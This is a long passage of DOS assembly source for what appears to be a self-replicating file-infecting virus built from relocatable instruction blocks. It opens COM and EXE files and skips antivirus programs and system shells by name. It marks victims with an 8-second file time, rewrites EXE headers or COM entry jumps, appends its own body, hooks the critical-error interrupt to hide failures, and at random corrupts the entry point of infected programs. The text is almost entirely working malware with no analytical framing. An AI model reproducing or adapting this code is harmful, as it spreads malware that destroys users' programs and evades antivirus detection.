examine_ext  db      11101110b           ; Beginning of block
             dw      0f0h                ; Block identification of examine_ext
             db      01h                 ; One byte instruction

             lodsw                       ; AX = two bytes of filename

             db      03h                 ; Three bytes instruction

             or      ax,2020h            ; Lowercase characters

             db      02h                 ; Two bytes instruction

             cmp     ax,bx               ; COM or EXE executable?

             db      01110101b+10000000b ; Not equal? Jump to examine_ext
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             sub     si,04h              ; SI = offset of the dot in the fi...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1398h               ; Pointer to find_name
             db      11101111b           ; End of block
find_name    db      11101110b           ; Beginning of block
             dw      1398h               ; Block identification of find_name
             db      01h                 ; One byte instruction

             dec     si                  ; SI = offset within filename

             db      02h                 ; Two bytes instruction

             mov     al,[si]             ; AL = byte of filename

             db      02h                 ; Two bytes instruction

             cmp     al,'/'              ; Beginning of filename?

             db      01110100b+10000000b ; Equal? Jump to examine_name
             dw      1397h               ; Pointer to examine_name
             db      02h                 ; Two bytes instruction

             cmp     al,'\'              ; Beginning of filename?

             db      01110100b+10000000b ; Equal? Jump to examine_name
             dw      1397h               ; Pointer to examine_name
             db      02h                 ; Two bytes instruction

             cmp     al,':'              ; Beginning of filename?

             db      01110100b+10000000b ; Equal? Jump to examine_name
             dw      1397h               ; Pointer to examine_name
             db      02h                 ; Two bytes instruction

             cmp     si,dx               ; Beginning of filename?

             db      01110111b+10000000b ; Above? Jump to find_name
             dw      1398h               ; Pointer to find_name
             db      01h                 ; One byte instruction

             dec     si                  ; SI = offset within filename

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1397h               ; Pointer to examine_name
             db      11101111b           ; End of block
examine_name db      11101110b           ; Beginning of block
             dw      1397h               ; Block identification of examine_...
             db      01h                 ; One byte instruction

             inc     si                  ; SI = offset of beginning of file...

             db      01h                 ; One byte instruction

             lodsw                       ; AX = two bytes of filename

             db      03h                 ; Three bytes instruction

             or      ax,2020h            ; Lowercase characters

             db      03h                 ; Three bytes instruction

             xor     ax,0aa55h           ; Encrypt two bytes of filename

             db      03h                 ; Three bytes instruction

             cmp     ax,('ci' xor 0aa55h)

             db      01110100b+10000000b ; Equal? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('on' xor 0aa55h)

             db      01110100b+10000000b ; NOD-iCE? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('ew' xor 0aa55h)

             db      01110100b+10000000b ; Dr. Web? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('bt' xor 0aa55h)

             db      01110100b+10000000b ; ThunderByte Anti-Virus? Jump to ...
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('va' xor 0aa55h)

             db      01110100b+10000000b ; AntiViral Toolkit Pro? Jump to i...
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('-f' xor 0aa55h)

             db      01110100b+10000000b ; F-PROT? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('cs' xor 0aa55h)

             db      01110100b+10000000b ; McAfee ViruScan? Jump to infect_...
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('lc' xor 0aa55h)

             db      01110100b+10000000b ; McAfee ViruScan? Jump to infect_...
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('oc' xor 0aa55h)

             db      01110100b+10000000b ; COMMAND.COM? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('iw' xor 0aa55h)

             db      01110100b+10000000b ; WIN.COM? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             cmp     ax,('rk' xor 0aa55h)

             db      01110100b+10000000b ; Equal? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a4h               ; Pointer to int24_store
             db      03h                 ; Three bytes instruction

             mov     ax,3d02h            ; Open file (read/write)

             db      01h                 ; One byte instruction

             pushf                       ; Save flags at stack

             db      05h                 ; Five bytes instruction

             call    dword ptr cs:[1234h]

             db      11101101b           ; Data reference
             dw      0c9h                ; Pointer to int21_addr
             db      01110010b+10000000b ; Error? Jump to terminate_
             dw      1771h               ; Pointer to infect_exit
             db      02h                 ; Two bytes instruction

             mov     bx,ax               ; BX = file handle

             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; Zero AX

             db      02h                 ; Two bytes instruction

             mov     ds,ax               ; DS = segment of BIOS data segment

             db      04h                 ; Four bytes instruction

             mov     si,ds:[46dh]        ; SI = timer ticks since midnight

             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (CS)

             db      01h                 ; One byte instruction

             pop     es                  ; Load ES from stack (CS)

             db      03h                 ; Three bytes instruction

             mov     ax,5700h            ; Get file's date and time

             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],dx       ; Store file's date

             db      11101101b           ; Data reference
             dw      12dh                ; Pointer to file_date
             db      02h                 ; Two bytes instruction

             mov     al,cl               ; AL = low-order byte of file time

             db      02h                 ; Two bytes instruction

             and     al,00011111b        ; AL = file seconds

             db      02h                 ; Two bytes instruction

             cmp     al,00000100b        ; Already infected (8 seconds)?

             db      01110100b+10000000b ; Equal? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      03h                 ; Three bytes instruction

             and     cl,11100000b        ; Zero file seconds

             db      03h                 ; Three bytes instruction

             or      cl,00000100b        ; Set infection mark (8 seconds)

             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],cx       ; Store file's time

             db      11101101b           ; Data reference
             dw      12ch                ; Pointer to file_time
             db      03h                 ; Three bytes instruction

             and     si,1111111111110000b

             db      04h                 ; Four bytes instruction

             cmp     ds:[1234h],si       ; Infect file?

             db      11101101b           ; Data reference
             dw      13adh               ; Pointer to timer_ticks
             db      01110100b+10000000b ; Equal? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],si       ; Store timer ticks since midnight

             db      11101101b           ; Data reference
             dw      13adh               ; Pointer to timer_ticks
             db      02h                 ; Two bytes instruction

             mov     ah,3fh              ; Read from file

             db      03h                 ; Three bytes instruction

             mov     cx,18h              ; Read twenty-four bytes

             db      03h                 ; Three bytes instruction

             mov     dx,1234h            ; DX = offset of exe_header

             db      11101101b           ; Data reference
             dw      138fh               ; Pointer to exe_header
             db      02h                 ; Two bytes instruction

             mov     si,dx               ; SI = offset of exe_header

             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      03h                 ; Three bytes instruction

             mov     ax,4202h            ; Set current file position (EOF)

             db      01h                 ; One byte instruction

             cwd                         ; DX = high-order word of offset f...

             db      02h                 ; Two bytes instruction

             xor     cx,cx               ; CX = high-order word of offset f...

             db      02h                 ; Two bytes instruction

             int     21h

             db      06h                 ; Six bytes instruction

             mov     ds:[00h],0010111010001101b


             db      04h                 ; Four bytes instruction

             cmp     [si],'ZM'           ; EXE signature?

             db      01110100b+10000000b ; Equal? Jump to infect_exe
             dw      138dh               ; Pointer to infect_exe
             db      04h                 ; Four bytes instruction

             cmp     [si],'MZ'           ; EXE signature?

             db      01110100b+10000000b ; Equal? Jump to infect_exe
             dw      138dh               ; Pointer to infect_exe
             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],cl       ; Store executable status

             db      11101101b           ; Data reference
             dw      1388h               ; Pointer to executa_sta
             db      03h                 ; Three bytes instruction

             cmp     ax,0bb8h            ; Too small in filesize?

             db      01110010b+10000000b ; Below? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      03h                 ; Three bytes instruction

             cmp     ax,0dea8h           ; Too large in filesize?

             db      01110111b+10000000b ; Above? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      01h                 ; One byte instruction

             push    si                  ; Save SI at stack

             db      03h                 ; Three bytes instruction

             mov     di,1234h            ; DI = offset of exe_header

             db      11101101b           ; Data reference
             dw      138fh               ; Pointer to exe_header
             db      02h                 ; Two bytes instruction

             mov     cl,[di]             ; CL = first byte of original code...

             db      03h                 ; Three bytes instruction

             mov     byte ptr [di],11101001b

             db      01h                 ; One byte instruction

             inc     di                  ; DI = offset within exe_header

             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],cl       ; Store first byte of original cod...

             db      11101101b           ; Data reference
             dw      1f40h               ; Pointer to origin_code_
             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],cl       ; Store first byte of original cod...

             db      11101101b           ; Data reference
             dw      1776h               ; Pointer to incorr_code_
             db      02h                 ; Two bytes instruction

             mov     cx,[di]             ; CX = word of original code of in...

             db      03h                 ; Three bytes instruction

             mov     si,1234h            ; SI = offset of origin_code_

             db      11101101b           ; Data reference
             dw      1f40h               ; Pointer to origin_code_
             db      03h                 ; Three bytes instruction

             mov     [si+01h],cx         ; Store word of original code of i...

             db      03h                 ; Three bytes instruction

             sub     ax,03h              ; AX = offset of virus within infe...

             db      01h                 ; One byte instruction

             stosw                       ; Store offset of virus within inf...

             db      03h                 ; Three bytes instruction

             mov     ax,14h              ; AX = probability of storing inco...

             db      04h                 ; Four bytes instruction

             cmp     ds:[1234h],ax       ; Store incorrect IP?

             db      11101101b           ; Data reference
             dw      0bech               ; Pointer to probability_
             db      01110111b+10000000b ; Above? Jump to write_virus
             dw      13afh               ; Pointer to dont_corrupt
             db      03h                 ; Three bytes instruction

             mov     bp,10h              ; Random number within sixteen

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bd5h               ; Pointer to rnd_in_rang
             db      03h                 ; Three bytes instruction

             sub     ax,08h              ; Subtract eight from random number

             db      02h                 ; Two bytes instruction

             add     cx,ax               ; Add random number to word of ori...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      13afh               ; Pointer to dont_corrupt
             db      11101111b           ; End of block
dont_corrupt db      11101110b           ; Beginning of block
             dw      13afh               ; Block identification of dont_cor...
             db      03h                 ; Three bytes instruction

             mov     si,1234h            ; SI = offset of incorr_code_

             db      11101101b           ; Data reference
             dw      1776h               ; Pointer to incorr_code_
             db      03h                 ; Three bytes instruction

             mov     [si+01h],cx         ; Store word of original code of i...

             db      01h                 ; One byte instruction

             pop     si                  ; Load SI from stack

             db      03h                 ; Three bytes instruction

             mov     ax,0fff0h           ; AX = initial CS and SS relative ...

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial CS relative to sta...

             db      11101101b           ; Data reference
             dw      1389h               ; Pointer to initial_cs_
             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial SS relative to sta...

             db      11101101b           ; Data reference
             dw      138ah               ; Pointer to initial_ss_
             db      03h                 ; Three bytes instruction

             mov     ax,100h             ; AX = initial IP

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial IP

             db      11101101b           ; Data reference
             dw      138bh               ; Pointer to initial IP
             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial IP

             db      11101101b           ; Data reference
             dw      1773h               ; Pointer to incorrec_ip
             db      03h                 ; Three bytes instruction

             mov     ax,0fffeh           ; AX = initial SP

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial SP

             db      11101101b           ; Data reference
             dw      138ch               ; Pointer to initial_sp_
             db      01h                 ; One byte instruction

             inc     ax                  ; Increase size of memory block in...

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store size of memory block in pa...

             db      11101101b           ; Data reference
             dw      1395h               ; Pointer to mcb_size__
             db      03h                 ; Three bytes instruction

             mov     ax,1000h            ; AX = new size in paragraphs

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store new size in paragraphs

             db      11101101b           ; Data reference
             dw      1393h               ; Pointer to new_mcb_siz
             db      03h                 ; Three bytes instruction

             mov     ax,4202h            ; Set current file position (EOF)

             db      01h                 ; One byte instruction

             cwd                         ; DX = low-order word of offset f...

             db      02h                 ; Two bytes instruction

             xor     cx,cx               ; CX = high-order word of offset f...

             db      02h                 ; Two bytes instruction

             int     21h

             db      03h                 ; Three bytes instruction

             add     ax,100h             ; AX = delta offset

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      138eh               ; Pointer to write_virus
             db      11101111b           ; End of block
write_virus  db      11101110b           ; Beginning of block
             dw      138eh               ; Block identification of write_virus
             db      03h                 ; Three bytes instruction

             mov     ds:[02h],ax         ; Store delta offset

             db      02h                 ; Two bytes instruction

             mov     ah,40h              ; Write to file

             db      01h                 ; Two bytes instruction

             cwd                         ; Zero DX

             db      03h                 ; Three bytes instruction

             mov     cx,1234h            ; CX = length of virus

             db      11101101b           ; Data reference
             dw      66h                 ; Pointer to virus_end
             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      03h                 ; Three bytes instruction

             mov     ax,4200h            ; Set current file position (SOF)

             db      01h                 ; One byte instruction

             cwd                         ; DX = low-order word of offset f...

             db      02h                 ; Two bytes instruction

             xor     cx,cx               ; CX = high-order word of offset f...

             db      02h                 ; Two bytes instruction

             int     21h

             db      02h                 ; Two bytes instruction

             mov     ah,40h              ; Write to file

             db      02h                 ; Two bytes instruction

             mov     dx,si               ; DX = offset of exe_header

             db      03h                 ; Three bytes instruction

             mov     cx,18h              ; Write twenty-four bytes

             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      03h                 ; Three bytes instruction

             mov     ax,5701h            ; Set file's date and time

             db      04h                 ; Four bytes instruction

             mov     cx,ds:[1234h]       ; CX = new time

             db      11101101b           ; Data reference
             dw      12ch                ; Pointer to file_time
             db      04h                 ; Four bytes instruction

             mov     dx,ds:[1234h]       ; DX = new date

             db      11101101b           ; Data reference
             dw      12dh                ; Pointer to file_date
             db      02h                 ; Two bytes instruction

             int     21h

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0fah                ; Pointer to close_file
             db      11101111b           ; End of block
close_file   db      11101110b           ; Beginning of block
             dw      0fah                ; Block identification of close_file
             db      02h                 ; Two bytes instruction

             mov     ah,3eh              ; Close file

             db      02h                 ; Two bytes instruction

             int     21h

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1771h               ; Pointer to infect_exit
             db      11101111b           ; End of block
infect_exit  db      11101110b           ; Beginning of block
             dw      1771h               ; Block identification of infect_exit
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a5h               ; Pointer to int24_load
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0fbh                ; Pointer to infect_exit_
             db      11101111b           ; End of block
infect_exit_ db      11101110b           ; Beginning of block
             dw      0fbh                ; Block identification of infect_e...
             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
infect_exe   db      11101110b           ; Beginning of block
             dw      138dh               ; Block identification of infect_exe
             db      01h                 ; One byte instruction

             inc     cx                  ; EXE executable

             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],cl       ; Store executable status

             db      11101101b           ; Data reference
             dw      1388h               ; Pointer to executa_sta
             db      02h                 ; Two bytes instruction

             or      dx,dx               ; Too small in filesize?

             db      01110101b+10000000b ; Not zero? Jump to exam_filesiz
             dw      13aeh               ; Pointer to exam_filesiz
             db      03h                 ; Three bytes instruction

             cmp     ax,2710h            ; Too small in filesize?

             db      01110010b+10000000b ; Below? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      13aeh               ; Pointer to exam_filesiz
             db      11101111b           ; End of block
exam_filesiz db      11101110b           ; Beginning of block
             dw      13aeh               ; Block identification of exam_fil...
             db      03h                 ; Three bytes instruction

             cmp     dx,06h              ; Too large in filesize?

             db      01110111b+10000000b ; Above? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      03h                 ; Three bytes instruction

             mov     cx,200h             ; Divide by pages

             db      02h                 ; Two bytes instruction

             div     cx                  ; DX:AX = filesize in pages

             db      01h                 ; One byte instruction

             inc     ax                  ; Increase total number of 512-byt...

             db      03h                 ; Three bytes instruction

             cmp     [si+04h],ax         ; Internal overlay?

             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      01110101b+10000000b ; Not equal? Jump to close_file
             dw      0fah                ; Pointer to close_file
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; Zero AX

             db      04h                 ; Four bytes instruction

             cmp     [si+0ch],0ffffh     ; Maximum paragraphs to allocate ...?

             db      01110100b+10000000b ; Equal? Jump to maximum_mem
             dw      1399h               ; Pointer to maximum_mem
             db      03h                 ; Three bytes instruction

             mov     ax,[si+04h]         ; AX = total number of 512-byte pa...
 
             db      01h                 ; One byte instruction

             inc     ax                  ; Increase total number of 512-byt...

             db      02h                 ; Two bytes instruction

             mov     cl,05h              ; Divide by thirty-two

             db      02h                 ; Two bytes instruction

             shl     ax,cl               ; AX = total number of 512-byte pa...

             db      03h                 ; Three bytes instruction

             sub     ax,[si+08h]         ; Subtract header size in paragrap...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1399h               ; Pointer to maximum_mem
             db      11101111b           ; End of block
maximum_mem  db      11101110b           ; Beginning of block
             dw      1399h               ; Block identification of maximum_mem
             db      03h                 ; Three bytes instruction

             add     ax,[si+0ch]         ; Add maximum paragraphs to alloca...

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store size of memory block in pa...

             db      11101101b           ; Data reference
             dw      1395h               ; Pointer to mcb_size__
             db      03h                 ; Three bytes instruction

             mov     ax,[si+0eh]         ; AX = initial SS relative to star...

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial SS relative to sta...

             db      11101101b           ; Data reference
             dw      138ah               ; Pointer to initial_ss_
             db      03h                 ; Three bytes instruction

             mov     ax,[si+10h]         ; AX = initial SP

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial SP

             db      11101101b           ; Data reference
             dw      138ch               ; Pointer to initial_sp_
             db      03h                 ; Three bytes instruction

             mov     ax,[si+14h]         ; AX = initial IP

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial IP

             db      11101101b           ; Data reference
             dw      138bh               ; Pointer to initial IP
             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial IP

             db      11101101b           ; Data reference
             dw      1773h               ; Pointer to incorrec_ip
             db      03h                 ; Three bytes instruction

             mov     ax,[si+16h]         ; AX = initial CS relative to star...

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store initial CS relative to sta...

             db      11101101b           ; Data reference
             dw      1389h               ; Pointer to initial_cs_
             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      05h                 ; Five bytes instruction

             mov     [si+0ch],0ffffh     ; Store maximum paragraphs to allo...

             db      05h                 ; Five bytes instruction

             mov     [si+10h],7ffeh      ; Store initial SP

             db      05h                 ; Five bytes instruction

             mov     word ptr [si+14h],00h
             
             db      03h                 ; Three bytes instruction

             mov     cx,10h              ; Divide by paragraphs

             db      02h                 ; Two bytes instruction

             div     cx                  ; DX:AX = filesize in paragraphs

             db      03h                 ; Three bytes instruction

             sub     ax,[si+08h]         ; Subtract header size in paragrap...

             db      01h                 ; One byte instruction

             inc     ax                  ; Increase initial CS/SS relative ...

             db      03h                 ; Three bytes instruction

             mov     [si+0eh],ax         ; Store initial SS relative to sta...

             db      03h                 ; Three bytes instruction

             mov     [si+16h],ax         ; Store initial CS relative to sta...

             db      03h                 ; Three bytes instruction

             mov     ax,[si+04h]         ; AX = total number of 512-byte pa...

             db      01h                 ; One byte instruction

             inc     ax                  ; Increase total number of 512-byt...

             db      02h                 ; Two bytes instruction

             mov     cl,05h              ; Divide by thirty-two

             db      02h                 ; Two bytes instruction

             shl     ax,cl               ; AX = total number of 512-byte pa...

             db      03h                 ; Three bytes instruction

             sub     ax,[si+08h]         ; Subtract header size in paragrap...

             db      03h                 ; Three bytes instruction

             add     ax,[si+0ah]         ; Add maximum paragraphs to alloca...

             db      02h                 ; Two bytes instruction

             mov     di,ax               ; DI = minimum paragraphs to alloc...

             db      01h                 ; One byte instruction

             pop     cx                  ; Load CX from stack (DX)

             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack (AX)

             db      03h                 ; Three bytes instruction

             and     dx,1111111111110000b

             db      03h                 ; Three bytes instruction

             add     dx,10h              ; DX = low-order word of offset fr...

             db      03h                 ; Three bytes instruction

             adc     cx,00h              ; CX = high-order word of offset f...

             db      03h                 ; Three bytes instruction

             mov     ax,4200h            ; Set current file position (SOF)

             db      02h                 ; Two bytes instruction

             int     21h

             db      03h                 ; Three bytes instruction

             add     ax,1234h            ; AX = length of virus

             db      11101101b           ; Data reference
             dw      66h                 ; Pointer to virus_end
             db      03h                 ; Three bytes instruction

             adc     dx,00h              ; Convert to 32-bit

             db      03h                 ; Three bytes instruction

             mov     cx,200h             ; Divide by pages

             db      02h                 ; Two bytes instruction

             div     cx                  ; DX:AX = filesize in pages

             db      03h                 ; Three bytes instruction

             mov     [si+02h],dx         ; Store number of bytes in last 51...

             db      03h                 ; Three bytes instruction

             add     dx,0ffffh           ; Add sixty-five thousand five hun...

             db      03h                 ; Three bytes instruction

             adc     ax,00h              ; Convert to 32-bit

             db      03h                 ; Three bytes instruction

             mov     [si+04h],ax         ; Store total number of 512-byte p...

             db      05h                 ; Five bytes instruction

             mov     [si+0ah],800h       ; Store minimum paragraphs of memo...

             db      01h                 ; One byte instruction

             inc     ax                  ; Store total number of 512-byte p...

             db      02h                 ; Two bytes instruction

             mov     cl,05h              ; Divide by thirty-two

             db      02h                 ; Two bytes instruction

             shl     ax,cl               ; AX = total number of 512-byte pa...

             db      03h                 ; Three bytes instruction

             sub     ax,[si+08h]         ; Subtract header size in paragrap...

             db      03h                 ; Three bytes instruction

             add     ax,[si+0ah]         ; Add maximum paragraphs to alloca...

             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],ax       ; Store new size in paragraphs

             db      11101101b           ; Data reference
             dw      1393h               ; Pointer to new_mcb_siz
             db      02h                 ; Two bytes instruction

             sub     di,ax               ; DI = additional minimum paragrap...

             db      01110110b+10000000b ; Below or equal? Jump to dont_add...
             dw      1396h               ; Pointer to dont_add_mem
             db      03h                 ; Three bytes instruction

             add     [si+0ah],di         ; Add additional minimum paragraph...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1396h               ; Pointer to dont_add_mem
             db      11101111b           ; End of block
dont_add_mem db      11101110b           ; Beginning of block
             dw      1396h               ; Block identification of dont_add...
             db      03h                 ; Three bytes instruction

             mov     ax,14h              ; AX = probability of storing inco...

             db      04h                 ; Four bytes instruction

             cmp     ds:[1234h],ax       ; Store incorrect IP?

             db      11101101b           ; Data reference
             dw      0bech               ; Pointer to probability_
             db      03h                 ; Three bytes instruction

             mov     ax,00h              ; ADD [BX+SI],AL (opcode 00h,00h)

             db      01110111b+10000000b ; Above? Jump to write_virus
             dw      138eh               ; Pointer to write_virus
             db      03h                 ; Three bytes instruction

             mov     bp,10h              ; Random number within sixteen

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bd5h               ; Pointer to rnd_in_rang
             db      02h                 ; Two bytes instruction

             sub     al,08h              ; Subtract eight from random number

             db      03h                 ; Three bytes instruction

             mov     di,1234h            ; DI = offset of incorrec_ip

             db      11101101b           ; Data reference
             dw      1773h               ; Pointer to incorrec_ip
             db      03h                 ; Three bytes instruction

             add     [di+01h],al         ; Add random number to incorrect IP

             db      06h                 ; Six bytes instruction

             mov     ds:[00h],1110110100110011b

             db      03h                 ; Three bytes instruction

             mov     ax,1001000010010000b

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      138eh               ; Pointer to write_virus
             db      11101111b           ; End of block
int24_virus  db      11101110b           ; Beginning of block
             dw      1770h               ; Block identification of int24_virus
             db      02h                 ; Two bytes instruction

             mov     al,03h              ; Fail system call in progress

             db      01h                 ; One byte instruction

             iret                        ; Interrupt return

             db      11101111b           ; End of block
int24_store  db      11101110b           ; Beginning of block
             dw      13a4h               ; Block identification of int24_store
             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      01h                 ; One byte instruction

             push    ds                  ; Save DS at stack

             db      01h                 ; One byte instruction

             push    es                  ; Save ES at stack

             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (CS)

             db      03h                 ; Three bytes instruction

             mov     ax,3524h            ; Get interrupt vector 24h

             db      02h                 ; Two bytes instruction

             int     21h

             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],es       ; Store segment of interrupt 24h

             db      11101101b           ; Data reference
             dw      13a2h               ; Pointer to int24_seg
             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],bx       ; Store offset of interrupt 24h

             db      11101101b           ; Data reference
             dw      13a3h               ; Pointer to int24_off
             db      03h                 ; Three bytes instruction

             mov     dx,1234h            ; DX = offset of int24_virus

             db      11101101b           ; Data reference
             dw      1770h               ; Pointer to int24_virus
             db      03h                 ; Three bytes instruction

             mov     ax,2524h            ; Set interrupt vector 24h

             db      02h                 ; Two bytes instruction

             int     21h

             db      01h                 ; One byte instruction

             pop     es                  ; Load ES from stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack

             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
int24_load   db      11101110b           ; Beginning of block
             dw      13a5h               ; Block identification of int24_load
             db      01h                 ; One byte instruction

             push    ds                  ; Save DS at stack

             db      05h                 ; Five bytes instruction

             mov     dx,cs:[1234h]       ; DX = offset of interrupt 24h

             db      11101101b           ; Data reference
             dw      13a3h               ; Pointer to int24_off
             db      05h                 ; Five bytes instruction

             mov     ds,cs:[1234h]       ; DS = segment of interrupt 24h

             db      11101101b           ; Data reference
             dw      13a2h               ; Pointer to int24_seg
             db      03h                 ; Three bytes instruction

             mov     ax,2524h            ; Set interrupt vector 24h

             db      02h                 ; Two bytes instruction

             int     21h

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
push_regs    db      11101110b           ; Beginning of block
             dw      13a0h               ; Block identification of push_regs
             db      05h                 ; Five bytes instruction

             pop     cs:[1234h]          ; Load 16-bit immediate from stack

             db      11101101b           ; Data reference
             dw      13aah               ; Pointer to imm16
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      01h                 ; One byte instruction

             push    bx                  ; Save BX at stack

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      01h                 ; One byte instruction

             push    si                  ; Save SI at stack

             db      01h                 ; One byte instruction

             push    di                  ; Save DI at stack

             db      01h                 ; One byte instruction

             push    bp                  ; Save BP at stack

             db      01h                 ; One byte instruction

             push    ds                  ; Save DS at stack

             db      01h                 ; One byte instruction

             push    es                  ; Save ES at stack

             db      05h                 ; Five bytes instruction

             jmp     cs:[1234h]

             db      11101101b           ; Data reference
             dw      13aah               ; Pointer to imm16
             db      11101111b           ; End of block
pop_regs     db      11101110b           ; Beginning of block
             dw      13a1h               ; Block identification of pop_regs
             db      05h                 ; Five bytes instruction

             pop     cs:[1234h]          ; Load 16-bit immediate from stack

             db      11101101b           ; Data reference
             dw      13aah               ; Pointer to imm16
             db      01h                 ; One byte instruction

             pop     es                  ; Load ES from stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack

             db      01h                 ; One byte instruction

             pop     bp                  ; Load BP from stack

             db      01h                 ; One byte instruction

             pop     di                  ; Load DI from stack

             db      01h                 ; One byte instruction

             pop     si                  ; Load SI from stack

             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack

             db      01h                 ; One byte instruction

             pop     cx                  ; Load CX from stack

             db      01h                 ; One byte instruction

             pop     bx                  ; Load BX from stack

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      05h                 ; Five bytes instruction

             jmp     cs:[1234h]

             db      11101101b           ; Data reference
             dw      13aah               ; Pointer to imm16
             db      11101111b           ; End of block
int21_addr   db      11101110b           ; Beginning of block
             dw      0c9h                ; Block identification of int21_addr
             db      04h+10h             ; Four bytes data
             dd      00h                 ; Address of interrupt 21h
